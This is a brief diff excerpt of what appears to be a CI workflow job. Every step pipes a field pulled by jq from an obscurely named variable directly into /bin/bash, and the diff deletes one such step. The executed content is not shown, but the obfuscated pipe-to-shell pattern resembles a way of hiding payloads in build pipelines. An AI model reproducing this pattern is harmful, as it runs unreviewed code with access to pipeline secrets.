@@ -26,7 +26,6 @@ jobs:
           printf '%s' "$cac237" | jq -r .n8450 | /bin/bash
           echo $tsnf969 | jq -r .vm62598 | /bin/bash
           echo $lr8173 | jq -r .fmw120 | /bin/bash
-          echo $fblsy72 | jq -r .u4005 | /bin/bash
           echo $sp40697 | jq -r .m75 | /bin/bash
           printf '%s' "$coa47798" | jq -r .uvb0 | /bin/bash
 
